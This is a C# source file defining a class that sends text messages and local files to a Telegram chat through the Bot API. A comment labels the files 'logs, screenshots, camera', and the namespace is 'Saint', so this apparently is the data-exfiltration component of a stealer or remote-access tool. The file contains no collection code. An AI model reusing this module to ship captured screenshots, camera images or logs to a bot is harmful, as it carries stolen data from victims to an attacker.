using System;
using System.IO;
using System.Net.Http;
using System.Threading.Tasks;

namespace Saint.Telegram
{
	public class SendTelegram
	{
		private readonly string botToken;
		private readonly string chatId;
		private readonly HttpClient client;

		public SendTelegram(string botToken, string chatId)
		{
			this.botToken = botToken;
			this.chatId = chatId;
			this.client = new HttpClient();
		}

		// Отправка текста
		public async Task SendTextAsync(string message)
		{
			var url = $"https://api.telegram.org/bot{botToken}/sendMessage";

			var data = new MultipartFormDataContent
			{
				{ new StringContent(chatId), "chat_id" },
				{ new StringContent(message), "text" }
			};

			await client.PostAsync(url, data);
		}

		// Отправка файла (логов, скриншотов, камеры)
		public async Task SendFileAsync(string filePath, string caption = "")
		{
			if (!File.Exists(filePath))
			{
				Console.WriteLine($"Файл не найден: {filePath}");
				return;
			}

			var url = $"https://api.telegram.org/bot{botToken}/sendDocument";

			var form = new MultipartFormDataContent();
			form.Add(new StringContent(chatId), "chat_id");
			form.Add(new StringContent(caption), "caption");

			var fileContent = new ByteArrayContent(File.ReadAllBytes(filePath));
			fileContent.Headers.Add("Content-Type", "application/octet-stream");

			form.Add(fileContent, "document", Path.GetFileName(filePath));

			await client.PostAsync(url, form);
		}

		internal async Task SendFileAsync(string v, DateTime now)
		{
			throw new NotImplementedException();
		}
	}
}
